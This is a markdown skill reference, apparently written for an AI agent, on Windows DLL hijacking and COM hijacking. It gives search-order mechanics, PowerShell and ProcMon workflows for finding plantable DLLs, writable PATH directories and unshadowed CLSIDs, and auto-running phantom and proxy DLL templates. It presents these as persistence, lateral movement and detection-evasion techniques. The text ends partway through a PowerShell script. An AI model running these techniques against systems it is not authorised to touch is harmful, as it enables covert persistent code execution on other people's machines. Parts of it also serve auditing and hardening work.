---
name: dll-hijacking-search-order-abuse
description: >
  Complete reference for DLL hijacking and Windows DLL search order abuse.
  Use when: implementing a persistent code-execution loader via DLL planting,
  identifying hijack opportunities in a target application via ProcMon/dumpbin,
  performing COM hijacking via HKCU registry key overrides, auditing an
  application for DLL planting vulnerabilities, or researching lateral movement
  through PATH poisoning. All techniques apply only to authorized targets.
  See DLL_Proxying.md for the forwarding layer after the DLL loads.
tags: [dll, hijacking, search-order, persistence, com, lateral-movement, windows, loader]
related_skills: [DLL_Proxying, DLL_Injection, IAT_Hooking, VTable_Hooking]
platforms: [Windows x86, Windows x64]
authorization: Authorized targets only — own processes, written permission, or applicable research/interoperability exemption.
---

================================================================================
  DLL HIJACKING & SEARCH ORDER ABUSE — COMPLETE TECHNICAL SKILL REFERENCE
  Covers: search order mechanics, all hijack types, discovery tooling,
          COM hijacking, PATH poisoning, KnownDLLs bypass, hardening,
          detection evasion, pitfalls, and full code examples.
================================================================================

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 1 — WHAT DLL HIJACKING IS
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

DLL hijacking exploits the Windows DLL search order to cause an application to
load your DLL instead of — or before — the intended one, without:
  - Modifying the application binary
  - Using injection APIs (no CreateRemoteThread, no WriteProcessMemory)
  - Requiring elevated privileges in most cases

The OS loader itself performs the hijack; you only need to be present in the
right location at the right time.

Hijacking produces:
  - Code execution in the target process's address space
  - Persistent execution tied to application startup
  - No visible process tree anomalies (your code runs in-process)
  - Full access to the process's memory, handles, and context

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1.1  COMPARISON TO OTHER CODE INJECTION METHODS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Method                   | Admin Needed | Remote APIs | Persistent | Detection Risk
  ─────────────────────────|──────────────|─────────────|────────────|───────────────
  DLL Hijacking            | No (usually) | None        | Yes        | Low
  DLL Injection (CRT)      | Usually      | Yes         | No         | High
  SetWindowsHookEx         | No           | Partial     | No         | Medium
  Manual Mapping           | Usually      | Yes         | No         | Low
  AppInit_DLLs             | Yes          | None        | Yes        | Medium
  COM Hijacking            | No           | None        | Yes        | Low

Hijacking is preferred for authorized game modding, tool loading, and research
when: (a) the application restarts frequently, (b) you want zero-injection-API
footprint, (c) you want the DLL to auto-load on every process start.

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 2 — WINDOWS DLL SEARCH ORDER
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2.1  STANDARD LOAD ORDER (SafeDllSearchMode = 1, default Vista+)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Applied when LoadLibrary("name.dll") is called WITHOUT a path.

  Step 1 : KnownDLLs registry key
           HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
           These are pre-mapped by SMSS. Cannot be hijacked via file placement.
           Examples: kernel32.dll, ntdll.dll, user32.dll, gdi32.dll,
                     advapi32.dll, ole32.dll, comctl32.dll, shell32.dll.
           → DLLs in KnownDLLs are NEVER loaded from disk again once SMSS
             maps them. Attempting to plant them in the app dir has no effect.

  Step 2 : The directory from which the application loaded
           (the folder containing the .exe — NOT the CWD unless they match)
           ← Primary hijack vector

  Step 3 : %SystemRoot%\System32   (C:\Windows\System32)
  Step 4 : %SystemRoot%\System       (16-bit system dir — mostly irrelevant)
  Step 5 : %SystemRoot%              (C:\Windows)
  Step 6 : Current working directory  ← CWD hijack vector
  Step 7 : Directories listed in %PATH%, left to right

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2.2  SAFEDLLSEARCHMODE = 0 (Legacy / Disabled)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  When SafeDllSearchMode is disabled (HKLM\SYSTEM\...\Session Manager\
  SafeDllSearchMode = 0), the CWD moves to position 2 (after app directory).
  This makes CWD hijacks far more powerful. Rarely encountered on modern systems
  but common on older Windows XP-era targets and some legacy industrial software.

  Order with SafeDllSearchMode=0:
    1. KnownDLLs
    2. Application directory
    3. Current working directory   ← promoted to position 3
    4. System32
    5. 16-bit system dir
    6. Windows dir
    7. %PATH%

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2.3  LOAD_LIBRARY_SEARCH_* FLAGS (Modern Apps)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Applications compiled to use LOAD_LIBRARY_SEARCH_SYSTEM32 bypass the standard
  search entirely and load ONLY from System32. These cannot be hijacked via
  app-dir planting unless the app also calls LoadLibrary without this flag for
  other DLLs.

  Flag values (can be bitwise OR'd):
    LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR   (0x0100) — DLL's own dir only
    LOAD_LIBRARY_SEARCH_APPLICATION_DIR (0x0200) — app dir only
    LOAD_LIBRARY_SEARCH_USER_DIRS      (0x0400) — AddDllDirectory paths
    LOAD_LIBRARY_SEARCH_SYSTEM32       (0x0800) — System32 only
    LOAD_LIBRARY_SEARCH_DEFAULT_DIRS   (0x1000) — System32 + user dirs

  Detection: check LoadLibraryExW calls in the import table with the second
  argument non-null (flags). If flags include 0x0800, the DLL cannot be hijacked
  via search-order abuse.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
2.4  KNOWNDLLS — COMPLETE EXCLUSION LIST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  These DLLs are pre-mapped by SMSS.exe and are effectively immune to file-based
  hijacking. Any name in this list cannot be hijacked by placing a DLL in the
  application directory.

  From a typical Windows 10/11 system:
    advapi32.dll, clbcatq.dll, combase.dll, COMDLG32.dll, coml2.dll,
    DifxApi.dll, gdi32.dll, gdiplus.dll, IMAGEHLP.dll, IMM32.dll,
    kernel32.dll, KERNELBASE.dll, MSASN1.dll, MSCTF.dll, MsCtfMonitor.dll,
    MSVCRT.dll, NORMALIZ.dll, NSI.dll, ntdll.dll, NTDSAPI.dll,
    ole32.dll, OLEAUT32.dll, PSAPI.DLL, rpcrt4.dll, sechost.dll,
    Setupapi.dll, SHCORE.dll, SHELL32.dll, SHLWAPI.dll, SORT.dll,
    user32.dll, WLDAP32.dll, wow64.dll, wow64win.dll, WS2_32.dll,
    WTSAPI32.dll

  To query programmatically:
    HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

  PowerShell:
    (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs").PSObject.Properties |
        Where-Object { $_.MemberType -eq 'NoteProperty' } |
        Select-Object -ExpandProperty Value

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 3 — TYPES OF DLL HIJACKING
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3.1  TYPE A — MISSING DLL (PHANTOM HIJACK, CLEANEST)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Situation:
    The application calls LoadLibrary("missing.dll") and the DLL does not exist
    anywhere in the search path. ProcMon shows NAME NOT FOUND for the load.

  Why it works:
    No real DLL exists to conflict with. Dropping your DLL is sufficient.
    No forwarding or proxying is required if the application doesn't actually
    use any exports from the DLL (it may just be checking for presence).

  When exports ARE needed:
    You must either implement the expected exports yourself or forward them
    to a real copy elsewhere. See DLL_Proxying.md for forwarding.

  Code — minimal phantom:

    // phantom_dll.cpp
    #include <windows.h>

    BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
        if (reason == DLL_PROCESS_ATTACH) {
            DisableThreadLibraryCalls(hMod);
            // Spawn a worker thread — NEVER do blocking work in DllMain
            HANDLE hThread = CreateThread(
                nullptr, 0,
                [](LPVOID param) -> DWORD {
                    HMODULE hSelf = static_cast<HMODULE>(param);
                    // Your code runs here, fully outside loader lock
                    // hSelf is the module handle for this DLL
                    return 0;
                },
                hMod, 0, nullptr
            );
            if (hThread) CloseHandle(hThread);
        }
        return TRUE;
    }

  CMake (DLL, no imports from original):

    add_library(phantom SHARED phantom_dll.cpp)
    set_target_properties(phantom PROPERTIES OUTPUT_NAME "missing")
    target_compile_options(phantom PRIVATE /GS- /Gy)  # no security cookie, ICF

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3.2  TYPE B — APP-DIR PHANTOM (MOST COMMON)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Situation:
    A legitimate system DLL is loaded WITHOUT a full path (LoadLibrary("winmm.dll")).
    Windows checks the app directory first before System32.
    The DLL is NOT in KnownDLLs.

  Strategy:
    Place a proxy DLL with the original DLL's name in the application directory.
    The proxy forwards all exports to the real system DLL.
    See DLL_Proxying.md for the full forwarding implementation.

  Best targets for Type B (confirmed non-KnownDLL, commonly loaded by games):

    DLL             | Typical Loader         | Notes
    ─────────────────|────────────────────────|──────────────────────────────
    version.dll      | Most Win32 EXEs        | Manifest version check
    winmm.dll        | Games, multimedia apps | Timebase, joystick, MIDI
    dinput8.dll      | DirectX games          | DirectInput, pre-DX11 titles
    xinput1_3.dll    | Games with gamepad     | Old XInput; loaded by path
    xinput1_4.dll    | UWP-style games        | Rarely in app dir
    dsound.dll       | Audio in games         | DirectSound
    d3d9.dll         | DX9-era games          | Primary hook for GTA SA etc.
    iphlpapi.dll     | Some launchers         | Network helpers
    cryptbase.dll    | Some apps (Win7 era)   | Crypto base; NOT KnownDLL on older OS
    msvcp140.dll     | MSVC 2015–2022 apps    | If shipped in app dir (common)
    vcruntime140.dll | MSVC 2015–2022 apps    | Same as above

  Verification before attempting (PowerShell):

    function Test-DllHijackable {
        param([string]$DllName)
        $knownDlls = (Get-ItemProperty `
            "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
        ).PSObject.Properties | Where-Object { $_.MemberType -eq 'NoteProperty' } |
            Select-Object -ExpandProperty Value
        $isKnown = $knownDlls -contains $DllName
        if ($isKnown) {
            Write-Host "BLOCKED: $DllName is a KnownDLL — cannot be hijacked via file placement"
        } else {
            Write-Host "VIABLE:  $DllName is NOT in KnownDLLs — hijackable"
        }
    }

    Test-DllHijackable "winmm.dll"    # VIABLE
    Test-DllHijackable "kernel32.dll" # BLOCKED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3.3  TYPE C — CWD (CURRENT WORKING DIRECTORY) HIJACK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Situation:
    Application calls SetCurrentDirectory() to a user-controlled path
    (e.g. the user's Downloads or Documents folder) and then calls
    LoadLibrary without a full path. With SafeDllSearchMode = 1, the CWD
    is searched after System32 (position 6), reducing CWD hijack viability on
    modern systems.

  Still relevant when:
    - SafeDllSearchMode = 0 (legacy system)
    - Target calls LoadLibrary for a DLL that does NOT exist in System32
    - Installer / setup executables that run from user-writable temp dirs
    - Applications that process user-supplied archives/packages that
      expand DLLs into the CWD before loading them

  Detection:
    ProcMon filter:
      Process Name = target.exe
      Operation    = CreateFile  (with OPEN access for .dll extension)
      Path ending  = .dll
      Result       = NAME NOT FOUND
      Path begins  = user-controlled directory

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3.4  TYPE D — PATH POISONING (LATERAL MOVEMENT)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Situation:
    A directory that appears earlier in %PATH% than System32 is writable by
    your current user. Any DLL placed there will be found before System32 for
    any process that PATH-searches for that DLL name.

  Impact: HIGH — affects ALL processes that load that DLL name via search order,
  not just one application.

  Finding writable PATH entries (PowerShell):

    $env:PATH -split ';' | ForEach-Object {
        $dir = $_.Trim()
        if (-not $dir) { return }
        try {
            $null = [System.IO.File]::Create("$dir\_test_write_.tmp")
            Remove-Item "$dir\_test_write_.tmp" -Force
            Write-Host "WRITABLE: $dir"
        } catch {
            # Not writable — skip
        }
    }

  Common writable PATH entries on misconfigured systems:
    - C:\Python310\   (user installed Python without admin)
    - C:\Ruby32-x64\bin\
    - C:\msys64\usr\bin\
    - C:\tools\  (chocolatey/scoop installs with user permissions)
    - Any user-added path via setx or environment variable GUI

  Strategy:
    1. Identify a DLL that is loaded path-first by a high-privilege process
       (or the target process) but does NOT exist in System32.
    2. Drop your DLL with that name in the writable PATH directory.
    3. That DLL will be loaded by every process that calls LoadLibrary on it.

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 4 — DISCOVERY TOOLING AND WORKFLOWS
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4.1  PROCESS MONITOR (PROCMON) WORKFLOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Process Monitor from Sysinternals is the primary discovery tool.

  Setup:
    1. Launch ProcMon.exe (admin recommended to capture all processes)
    2. Clear existing events: Ctrl+X
    3. Configure filters:

       Filter → Add:
         Column: Process Name   Is: target.exe             Action: Include
         Column: Operation      Is: CreateFile             Action: Include
         Column: Path           Ends with: .dll            Action: Include

    4. Launch the target application
    5. Stop capture: Ctrl+E

  Reading results:
    - Result = SUCCESS + LoadImage operation → DLL successfully loaded from this path
    - Result = NAME NOT FOUND for a .dll path → opportunity
    - Multiple NAME NOT FOUND in app directory before a SUCCESS in System32
      → strong indicator: plant your DLL in the app directory

  Export to CSV for scripting:
    File → Save → All Events → CSV format

  Parse CSV in PowerShell to find hijack opportunities:

    $procmon = Import-Csv "procmon_output.csv"
    $procmon |
        Where-Object {
            $_."Result"    -like "NAME NOT FOUND" -and
            $_."Path"      -like "*.dll"          -and
            $_."Operation" -eq "CreateFile"
        } |
        Select-Object "Time of Day", "Process Name", "Path", "Result" |
        Sort-Object "Path" -Unique

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4.2  STATIC ANALYSIS — DUMPBIN / PEDUMP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  List imports and check which DLLs are candidates:

    dumpbin /IMPORTS target.exe

  Output shows import descriptor for each DLL:
    Section contains the following imports:
      winmm.dll
             ...
      version.dll
             ...

  Cross-reference each imported DLL against KnownDLLs list (Section 2.4).
  Any imported DLL NOT in KnownDLLs is a candidate for Type B hijacking.

  Automation (PowerShell using dumpbin):

    $exe = "C:\Games\target\target.exe"
    $knownDlls = (Get-ItemProperty `
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
    ).PSObject.Properties | Where-Object { $_.MemberType -eq 'NoteProperty' } |
        Select-Object -ExpandProperty Value | ForEach-Object { $_.ToLower() }

    $imports = & dumpbin /IMPORTS $exe 2>$null |
        Select-String '^\s+\S+\.dll' |
        ForEach-Object { $_.Line.Trim() }

    $imports | ForEach-Object {
        $dll = $_.ToLower()
        if ($knownDlls -notcontains $dll) {
            Write-Host "CANDIDATE: $_"
        }
    }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4.3  DEPENDENCIES (FORMERLY DEPENDENCY WALKER) WORKFLOW
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Dependencies.exe (GUI) — https://github.com/lucasg/Dependencies

  Workflow:
    1. Open target.exe in Dependencies
    2. Tree view shows entire import chain
    3. Red nodes = DLLs not found at static analysis time
    4. Yellow nodes = delay-loaded DLLs
    5. Right-click any node → "Copy module name"

  For hijacking:
    - Red nodes represent DLLs that may not be present → phantom hijack (Type A)
    - Non-KnownDLL nodes that the app loads from a search-able path → Type B

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
4.4  PROGRAMMATIC CHECK — IS A DLL HIJACKABLE?
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Full C++ runtime check to determine if a DLL name is subject to search-order
  loading and not pre-empted by KnownDLLs:

  ```cpp
  #include <windows.h>
  #include <string>

  // Returns true if dllName can be planted in app dir to hijack loading.
  // Checks KnownDLLs registry, not file existence.
  bool IsDllHijackable(const wchar_t* dllName) {
      // Convert to lowercase for case-insensitive comparison
      std::wstring nameLow = dllName;
      for (auto& c : nameLow) c = towlower(c);

      HKEY hKey = nullptr;
      LSTATUS ls = RegOpenKeyExW(
          HKEY_LOCAL_MACHINE,
          L"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs",
          0, KEY_READ, &hKey);
      if (ls != ERROR_SUCCESS) return true; // Can't check — assume hijackable

      bool isKnown = false;
      DWORD index = 0;
      wchar_t valueName[256];
      wchar_t valueData[256];
      DWORD nameLen, dataLen, type;

      while (true) {
          nameLen = _countof(valueName);
          dataLen = sizeof(valueData);
          ls = RegEnumValueW(hKey, index++, valueName, &nameLen,
                             nullptr, &type, (LPBYTE)valueData, &dataLen);
          if (ls == ERROR_NO_MORE_ITEMS) break;
          if (ls != ERROR_SUCCESS) continue;
          if (type != REG_SZ) continue;

          std::wstring val = valueData;
          for (auto& c : val) c = towlower(c);
          if (val == nameLow) { isKnown = true; break; }
      }
      RegCloseKey(hKey);
      return !isKnown;
  }
  ```

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 5 — PAYLOAD DLL IMPLEMENTATIONS
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5.1  DLLMAIN RULES (CRITICAL — VIOLATING THESE CAUSES DEADLOCKS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  DllMain is called while the loader lock is held. Inside DllMain you MUST NOT:
    ✗ Call LoadLibrary or FreeLibrary
    ✗ Call CoInitialize / CoCreateInstance
    ✗ Call any function that acquires a non-loader lock (some CRT functions)
    ✗ Wait on a thread that could also call LoadLibrary
    ✗ Do any substantial work that could take unbounded time

  Safe in DllMain:
    ✓ DisableThreadLibraryCalls(hMod)   — suppress thread-attach notifications
    ✓ Store hMod to a global
    ✓ CreateThread — but do NOT wait on it inside DllMain
    ✓ Simple flag assignments
    ✓ TlsAlloc, TlsSetValue

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5.2  MINIMAL PHANTOM DLL TEMPLATE (NO EXPORTS NEEDED)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  ```cpp
  // phantom.cpp — drop as target_name.dll in app directory
  #include <windows.h>

  static HMODULE g_hSelf = nullptr;
  static HANDLE  g_hWorker = nullptr;

  // All real work happens here — outside loader lock
  static DWORD WINAPI WorkerThread(LPVOID) {
      // --- Your tool/mod initialization code here ---
      // LoadLibrary is safe here, CRT is safe, COM is safe
      return 0;
  }

  BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
      switch (reason) {
      case DLL_PROCESS_ATTACH:
          g_hSelf = hMod;
          DisableThreadLibraryCalls(hMod);
          g_hWorker = CreateThread(nullptr, 0, WorkerThread, nullptr, 0, nullptr);
          break;

      case DLL_PROCESS_DETACH:
          // Signal worker to stop if still running
          // Do not wait — DLL_PROCESS_DETACH may come during process shutdown
          break;
      }
      return TRUE;
  }
  ```

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5.3  PROXY DLL TEMPLATE (EXPORTS FORWARDED, CODE RUNS ON ATTACH)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  When the target application actually calls functions from the hijacked DLL,
  you must forward exports to the real copy. See DLL_Proxying.md for the full
  forwarding implementation.

  Quick template for version.dll proxy (loads real version from System32):

  ```cpp
  // version_proxy.cpp
  // Compile as version.dll, place real copy as version_orig.dll in System32 path,
  // OR forward directly to C:\Windows\System32\version.dll

  // Forward all exports to System32 copy:
  #pragma comment(linker, "/EXPORT:GetFileVersionInfoA=C:\\Windows\\System32\\version.GetFileVersionInfoA")
  // ... (use the PowerShell script in DLL_Proxying.md to generate all pragmas)

  #include <windows.h>
  #include "your_tool.h"

  BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
      if (reason == DLL_PROCESS_ATTACH) {
          DisableThreadLibraryCalls(hMod);
          CreateThread(nullptr, 0,
              [](LPVOID) -> DWORD { YourTool_Init(); return 0; },
              nullptr, 0, nullptr);
      }
      return TRUE;
  }
  ```

  NOTE: The `/EXPORT:name=C:\Windows\System32\dll.name` linker syntax uses a
  full path forwarder. Alternatively, rename the real DLL to `orig_version.dll`
  in the same directory and use `orig_version.FunctionName` as the forward target.
  See DLL_Proxying.md Section 3 for the recommended approach.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
5.4  DELAY-LOAD AWARE INITIALIZATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  If your hijack DLL itself delay-loads other modules, or the target application
  uses delay-loaded imports from you, the load order differs:

  Normal load: DllMain fires when LoadLibrary is called (at startup or on demand)
  Delay-load:  DllMain fires on FIRST CALL to an exported function

  Implication: You cannot rely on DllMain firing at a predictable point in the
  application's initialization sequence if your DLL is delay-loaded. Check
  with ProcMon whether the Load Image event for your DLL fires at startup or
  only after a specific user action.

  To check if the target delay-loads your hijack target:
    dumpbin /LOADCONFIG target.exe | findstr "Delay"
    dumpbin /IMPORTS target.exe — look for DELAYIMP section

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
  PART 6 — COM HIJACKING
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
6.1  HOW COM HIJACKING WORKS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  COM objects are identified by CLSID (128-bit GUID). When an application calls
  CoCreateInstance({CLSID}, ...) the COM subsystem looks up the DLL path in:

    1. HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32  ← user-writable, no elevation
    2. HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32  ← machine-wide, requires admin

  HKCU entries SHADOW HKLM entries. A normal (non-admin) user can create entries
  under HKCU\Software\Classes\CLSID that override the machine-wide registration,
  and Windows will load from the HKCU path instead.

  This means:
    - No elevation needed
    - No file placement in protected directories
    - The override persists across reboots and process restarts
    - Affects any process that instantiates the CLSID under the current user

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
6.2  FINDING HIJACKABLE CLSIDs
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

  Method A: ProcMon
    Filter:
      Operation: RegOpenKey
      Result:    NAME NOT FOUND
      Path:      contains CLSID

    The NAME NOT FOUND results show CLSIDs the app tried to load from HKCU
    (user override path) but failed. These are your hijack targets — the app
    will fall back to HKLM but you can intercept by creating the HKCU entry.

  Method B: PowerShell enumeration
    Find CLSIDs in HKLM that have no HKCU override (nobody has hijacked them yet):

    ```powershell
    $hklmBase = "HKLM:\Software\Classes\CLSID"
    $hkcuBase = "HKCU:\Software\Classes\CLSID"

    # Get HKCU CLSIDs that already exist (already hijacked or user-registered)
    $hkcuExisting = @{}
    if (Test-Path $hkcuBase) {
        Get-ChildItem $hkcuBase -ErrorAction SilentlyContinue |
            ForEach-Object { $hkcuExisting[$_.PSChildName] = $true }
    }

    # Find HKLM CLSIDs loaded via InprocServer32 with no HKCU override
    Get-ChildItem $hklmBase -ErrorAction SilentlyContinue |
        Where-Object { -not $hkcuExisting.ContainsKey($_.PSChildName) } |
        ForEach-Object {
            $clsid = $_.PSChildName
            $inproc = Join-Path $_.PSPath "InprocServer32"
            if (Test-Path $inproc) {
